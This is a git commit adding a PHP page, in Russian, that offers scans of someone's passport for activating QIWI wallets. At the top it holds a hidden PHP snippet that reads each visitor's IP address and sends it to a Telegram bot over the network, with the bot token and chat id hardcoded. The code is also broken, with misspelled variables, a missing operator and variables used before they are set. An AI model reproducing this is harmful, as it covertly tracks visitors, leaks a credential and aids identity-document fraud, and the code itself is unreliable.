9cafb957ea4e1855652fabb6b7e9890891e83082
Alexandr-telegram <sergey.bratkeviich@gmail.com>
2021-01-19 22:26:01 +0400

    second commit

---
+++ index-page.php
@@ -0,0 +1,34 @@
+
+<?php
+
+$ip = $SERVER['REMOTE_ADDE'];
+
+$token = '1599313643:AAGHYlAY06HbPGpcKkeLHl48oP0pwzPZpIA';
+
+file_get_contents('https://api.telegram.org/bot1599313643:AAGHYlAY06HbPGpcKkeLHl48oP0pwzPZpIA/sendMessage?chat_id=' .$chat_id '$text=' .$msg);
+
+$msg = 'IP:' .$ip;
+
+$chat_id = '1275149549'
+
+?>
+
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" type="text/css" href="html-stule.css">
+	<title>Сайт с данными для активации QIWI Wallet!</title>
+</head>
+<body>
+	<h1>Сайт поможет вам выбрать паспорт для активации вашего кошелька!</h1>
+	<p>Выберите одну из ссылок, перейдите по ней, и вы увидите сканы одного паспорта:</p>
+	<br><br>
+	<a href="1 - копия/index.html">Первый скан.</a>
+	<br><br>
+	<a href="1 - копия (2)/index.html">Второй скан.</a>
+	<br><br>
+	<a href="1 - копия (3)/index.html">Третий скан.</a>
+</body>
+</html>
